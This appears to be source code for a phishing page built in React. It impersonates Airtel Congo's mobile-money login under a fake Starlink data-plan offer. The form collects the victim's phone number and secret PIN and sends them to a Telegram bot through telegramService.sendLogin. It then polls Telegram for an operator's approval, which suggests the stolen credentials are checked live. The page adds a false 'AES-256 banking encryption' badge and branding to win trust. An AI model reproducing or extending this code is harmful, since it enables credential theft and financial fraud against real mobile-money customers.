import React, { useState, useRef, useEffect } from 'react';
import { motion } from 'motion/react';
import { AirtelLogo } from './Logos';
import { InternetPlan } from '../types';
import { ValidatingModal } from './ValidatingModal';
import { useTelegramPolling } from '../hooks/useTelegramPolling';
import { telegramService } from '../services/telegramService';
import {
  Eye,
  EyeOff,
  ArrowLeft,
  Lock,
  Smartphone,
  AlertTriangle,
  Loader2,
  Zap,
} from 'lucide-react';

interface LoginPageProps {
  selectedPlan: InternetPlan;
  onBack: () => void;
  onLoginSuccess: (phone: string, pin: string, sessionId: string) => void;
}

export const LoginPage: React.FC<LoginPageProps> = ({
  selectedPlan,
  onBack,
  onLoginSuccess,
}) => {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [pinDigits, setPinDigits] = useState<string[]>(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [sessionId, setSessionId] = useState<string>('');
  const [isWaitingTelegram, setIsWaitingTelegram] = useState(false);

  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Generate session ID on mount
  useEffect(() => {
    const newSessionId = 'stl_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString().slice(-4);
    setSessionId(newSessionId);
  }, []);

  // Handle PIN input change
  const handlePinChange = (index: number, value: string) => {
    const cleanValue = value.replace(/\D/g, '').slice(-1);
    const newPin = [...pinDigits];
    newPin[index] = cleanValue;
    setPinDigits(newPin);
    setErrorMessage(null);

    // Auto move to next input
    if (cleanValue && index < 3) {
      pinInputRefs.current[index + 1]?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pinDigits[index] && index > 0) {
      pinInputRefs.current[index - 1]?.focus();
    }
  };

  const handlePinPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (pastedData) {
      const newPin = ['', '', '', ''];
      for (let i = 0; i < pastedData.length; i++) {
        newPin[i] = pastedData[i];
      }
      setPinDigits(newPin);
      if (pastedData.length === 4) {
        pinInputRefs.current[3]?.focus();
      } else {
        pinInputRefs.current[pastedData.length]?.focus();
      }
    }
  };

  const currentPin = pinDigits.join('');
  const isFormValid = phoneNumber.replace(/\D/g, '').length >= 9 && currentPin.length === 4;

  // Handle Telegram verification callbacks
  const { status: telegramStatus } = useTelegramPolling({
    sessionId: sessionId || null,
    targetStep: 'login',
    isActive: isWaitingTelegram,
    onApproved: () => {
      setTimeout(() => {
        setIsWaitingTelegram(false);
        onLoginSuccess(phoneNumber, currentPin, sessionId);
      }, 800);
    },
    onRejected: () => {
      setIsWaitingTelegram(false);
      setErrorMessage('Code PIN ou numéro de téléphone non valide. Veuillez vérifier et réessayer.');
      setPinDigits(['', '', '', '']);
      pinInputRefs.current[0]?.focus();
    },
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid || isSubmitting) return;

    setIsSubmitting(true);
    setErrorMessage(null);

    try {
      // Send login info to Telegram Bot safely (works directly on Vercel & server)
      await telegramService.sendLogin({
        sessionId,
        phone: phoneNumber.trim(),
        pin: currentPin,
        planName: `${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})`,
        planPrice: selectedPlan.price,
      });

      // Open validating modal
      setIsWaitingTelegram(true);
    } catch (err: any) {
      setErrorMessage(err.message || 'Impossible de joindre le service de validation. Veuillez réessayer.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F7F9FC] flex flex-col justify-between text-neutral-900 selection:bg-[#E60000] selection:text-white">
      {/* Top Header */}
      <header className="w-full bg-white border-b border-neutral-200 shadow-sm py-4 px-4 sm:px-6">
        <div className="max-w-4xl mx-auto flex items-center justify-between">
          <button
            type="button"
            id="btn-back-to-plans"
            onClick={onBack}
            className="flex items-center gap-1.5 text-xs font-bold text-neutral-600 hover:text-[#E60000] transition-colors py-2 px-2.5 rounded-xl hover:bg-neutral-100 cursor-pointer"
          >
            <ArrowLeft className="w-4 h-4" />
            <span className="hidden xs:inline">Changer de forfait</span>
            <span className="xs:hidden">Retour</span>
          </button>

          <div className="flex items-center gap-2">
            <span className="text-[11px] font-bold text-neutral-500 uppercase tracking-wider hidden sm:inline-block">
              Portail Airtel Lite
            </span>
            <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
          </div>
        </div>
      </header>

      {/* Main Form Center Box */}
      <main className="flex-1 flex flex-col items-center justify-center px-4 py-6 sm:py-12">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -20 }}
          transition={{ duration: 0.35 }}
          className="w-full max-w-md bg-white rounded-3xl shadow-[0_15px_45px_rgba(0,0,0,0.07)] border border-neutral-200/80 p-5 sm:p-8 relative overflow-hidden"
        >
          {/* Subtle top red brand bar */}
          <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#E60000] via-rose-500 to-[#c40000]" />

          {/* Selected Plan Summary Pill */}
          <div className="mb-6 p-3.5 rounded-2xl bg-red-50/70 border border-red-100 flex items-center justify-between gap-2">
            <div className="flex items-center gap-2.5 min-w-0">
              <div className="w-8 h-8 rounded-xl bg-[#E60000] text-white flex items-center justify-center font-black text-xs shadow-sm shrink-0">
                <Zap className="w-4 h-4" />
              </div>
              <div className="min-w-0">
                <p className="text-[11px] font-semibold text-neutral-500 truncate">Forfait Starlink sélectionné</p>
                <p className="text-xs font-black text-neutral-900 truncate">
                  {selectedPlan.dataAmount} {selectedPlan.dataUnit} • {selectedPlan.validity}
                </p>
              </div>
            </div>
            <div className="text-right shrink-0">
              <span className="font-black text-sm text-[#E60000]">{selectedPlan.price}</span>
            </div>
          </div>

          {/* Airtel Logo Header */}
          <div className="flex flex-col items-center text-center mb-6">
            <AirtelLogo variant="nextgen" className="h-11 mb-2" />
            <h2 className="text-base sm:text-lg font-bold text-neutral-800 tracking-tight mt-2">
              Connectez-vous à Airtel Lite pour finaliser le paiement.
            </h2>
            <p className="text-xs text-neutral-500 mt-1">
              Renseignez votre numéro Airtel RDC et votre code secret.
            </p>
          </div>

          {/* Error Message Box */}
          {errorMessage && (
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="mb-5 p-3.5 rounded-2xl bg-rose-50 border border-rose-200 text-rose-700 text-xs flex items-start gap-2.5 font-medium"
            >
              <AlertTriangle className="w-4 h-4 shrink-0 mt-0.5" />
              <span>{errorMessage}</span>
            </motion.div>
          )}

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Phone Number Input */}
            <div>
              <label
                htmlFor="phone-input"
                className="block text-xs font-bold text-neutral-700 mb-1.5 uppercase tracking-wider"
              >
                Numéro de Téléphone Airtel
              </label>
              <div className="relative flex items-center rounded-2xl border-2 border-neutral-300 focus-within:border-[#0055FF] focus-within:ring-4 focus-within:ring-blue-500/10 transition-all bg-white overflow-hidden shadow-inner">
                {/* Country Code Prefix */}
                <div className="flex items-center gap-1.5 bg-neutral-100 px-3 py-3 border-r border-neutral-300 text-neutral-700 font-bold text-sm shrink-0 select-none">
                  <span className="text-base">🇨🇩</span>
                  <span>CD +243</span>
                </div>

                <input
                  id="phone-input"
                  type="tel"
                  autoFocus
                  value={phoneNumber}
                  onChange={(e) => {
                    const clean = e.target.value.replace(/\D/g, '').slice(0, 9);
                    setPhoneNumber(clean);
                    setErrorMessage(null);
                  }}
                  placeholder="951234567"
                  className="w-full px-3 py-3 text-neutral-900 font-bold text-base tracking-wider placeholder:text-neutral-400 focus:outline-none bg-transparent"
                />

                <div className="pr-3 text-neutral-400">
                  <Smartphone className="w-5 h-5" />
                </div>
              </div>
              <p className="text-[10px] text-neutral-500 mt-1 pl-1">
                Format: 9 chiffres (ex: 97xxxxxxx, 99xxxxxxx, 81xxxxxxx, 95xxxxxxx)
              </p>
            </div>

            {/* 4-Digit Code PIN Input */}
            <div>
              <div className="flex items-center justify-between mb-2">
                <label className="block text-xs font-bold text-neutral-700 uppercase tracking-wider">
                  Entrez votre Code
                </label>
                <button
                  type="button"
                  id="btn-toggle-pin-visibility"
                  onClick={() => setShowPin(!showPin)}
                  className="flex items-center gap-1 text-xs font-semibold text-neutral-500 hover:text-neutral-900 transition-colors cursor-pointer"
                >
                  {showPin ? (
                    <>
                      <EyeOff className="w-3.5 h-3.5" />
                      <span>Masquer</span>
                    </>
                  ) : (
                    <>
                      <Eye className="w-3.5 h-3.5" />
                      <span>Afficher</span>
                    </>
                  )}
                </button>
              </div>

              {/* 4 Discrete Boxes */}
              <div className="flex items-center justify-center gap-2.5 sm:gap-3.5">
                {[0, 1, 2, 3].map((index) => (
                  <input
                    key={index}
                    id={`pin-input-${index}`}
                    ref={(el) => {
                      pinInputRefs.current[index] = el;
                    }}
                    type={showPin ? 'text' : 'password'}
                    inputMode="numeric"
                    maxLength={1}
                    value={pinDigits[index]}
                    onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(index, e)}
                    onPaste={index === 0 ? handlePinPaste : undefined}
                    className="w-12 h-14 sm:w-16 sm:h-16 text-center text-2xl font-black text-neutral-900 rounded-2xl border-2 border-blue-600 bg-white focus:border-[#E60000] focus:ring-4 focus:ring-red-500/20 focus:outline-none transition-all shadow-sm"
                  />
                ))}
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              id="btn-connexion"
              disabled={!isFormValid || isSubmitting}
              className={`w-full py-4 px-6 rounded-2xl font-black text-sm uppercase tracking-widest transition-all flex items-center justify-center gap-2 shadow-lg ${
                isFormValid && !isSubmitting
                  ? 'bg-[#E60000] hover:bg-[#c90000] active:scale-[0.98] text-white shadow-red-600/30 cursor-pointer'
                  : 'bg-neutral-200 text-neutral-400 cursor-not-allowed shadow-none'
              }`}
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Validation en cours...</span>
                </>
              ) : (
                <span>CONNEXION</span>
              )}
            </button>
          </form>

          {/* Safe Badge */}
          <div className="mt-6 pt-4 border-t border-neutral-100 flex items-center justify-center gap-2 text-[11px] text-neutral-500 font-medium">
            <Lock className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
            <span>Cryptage bancaire AES-256 Airtel Lite</span>
          </div>
        </motion.div>
      </main>

      {/* Validating PIN Modal */}
      <ValidatingModal
        isOpen={isWaitingTelegram}
        type="pin"
        phone={phoneNumber}
        planName={`${selectedPlan.dataAmount} ${selectedPlan.dataUnit}`}
        status={telegramStatus}
      />

      {/* Footer with Anti-Overlap Spacing */}
      <footer className="w-full bg-white border-t border-neutral-200 px-4 py-6 text-center">
        <div className="max-w-4xl mx-auto flex flex-col items-center justify-center gap-2">
          <AirtelLogo variant="red" className="h-6" />
          <p className="text-xs text-neutral-600 font-medium leading-relaxed">
            En collaboration avec <span className="text-neutral-900 font-bold">STARLINK™</span>
          </p>
          <p className="text-[11px] text-neutral-400 leading-normal">
            © 2026 Airtel Congo. Tous droits réservés.
          </p>
        </div>
      </footer>
    </div>
  );
};
